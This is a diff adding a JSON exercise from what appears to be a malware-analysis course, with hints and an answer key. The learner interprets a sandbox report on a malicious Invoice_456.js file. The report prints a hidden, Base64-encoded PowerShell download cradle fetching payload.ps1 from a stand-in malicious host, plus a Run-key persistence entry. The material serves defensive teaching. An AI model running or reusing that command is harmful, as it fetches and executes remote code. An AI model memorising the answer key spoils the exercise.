@@ -1,0 +1,17 @@
+{
+    "id": "task2",
+    "chapterId": "ch_11",
+    "title": "Interpret Sandbox Results",
+    "description": "Review a dynamic analysis report and identify key behavioral indicators.",
+    "estimatedMinutes": 15,
+    "problemStatement": "You received an automated sandbox report for a file named `Invoice_456.js`. Review the summarized findings below and answer the questions.\n\n**Sandbox Report Summary:**\n- **Process Tree:** `wscript.exe` (PID 1234) spawned `powershell.exe` (PID 5678).\n- **PowerShell Command Line:** `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAXQAuAHAAcwAxACcAKQA=`\n- **Network Connections:** `powershell.exe` (PID 5678) connected to `185.142.53.179:443`.\n- **DNS Queries:** `malicious.com` resolved to `185.142.53.179`.\n- **File Created:** `C:\\Users\\Public\\Documents\\svchost.exe`.\n- **Registry Modified:** `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate` set to `C:\\Users\\Public\\Documents\\svchost.exe`.\n\n**Task:**\n1. What is the initial infection vector? (Based on file extension and process tree).\n2. What is the purpose of the encoded PowerShell command? (Decode hint: It's a download cradle).\n3. Identify **two (2) IOCs** from the report.\n4. What **persistence mechanism** was established?\n5. What **MITRE ATT&CK Technique** best describes the PowerShell activity? (Hint: T1059.001)\n\n**Output Format:**\n```\n1. Infection Vector: [Answer]\n2. PowerShell Purpose: [Answer]\n3. IOCs:\n   - [IOC 1]\n   - [IOC 2]\n4. Persistence: [Answer]\n5. ATT&CK Technique: [Answer]\n```",
+    "hints": [
+        ".js files run via wscript.exe.",
+        "Encoded PowerShell downloading from a URL is a 'download cradle'.",
+        "IOCs can be IPs, domains, file paths, or registry keys.",
+        "The Run key modification is persistence.",
+        "T1059.001 is PowerShell."
+    ],
+    "expectedOutput": "1. Infection Vector: Malicious JavaScript (.js) file executed by Windows Script Host (wscript.exe).\n2. PowerShell Purpose: Download and execute a remote payload (malware dropper/downloader).\n3. IOCs:\n   - Domain: malicious.com\n   - IP: 185.142.53.179\n   - URL: http://malicious.com/payload.ps1\n   - Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate\n4. Persistence: Registry Run Key (HKCU Run key) pointing to the dropped executable.\n5. ATT&CK Technique: T1059.001 (PowerShell)",
+    "solutionCode": "1. Infection Vector: Phishing email containing a malicious JavaScript file (Invoice_456.js) executed via Windows Script Host (wscript.exe).\n2. PowerShell Purpose: The Base64-encoded command is a PowerShell download cradle. It downloads and executes a remote script (payload.ps1) from a malicious server.\n3. IOCs:\n   - Domain: malicious.com\n   - IP Address: 185.142.53.179\n   - URL: http://malicious.com/payload.ps1\n   - Dropped File: C:\\Users\\Public\\Documents\\svchost.exe\n   - Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate\n4. Persistence: Registry Run Key (HKCU Run) ensuring svchost.exe executes on user login.\n5. ATT&CK Technique: T1059.001 (Command and Scripting Interpreter: PowerShell)"
+}
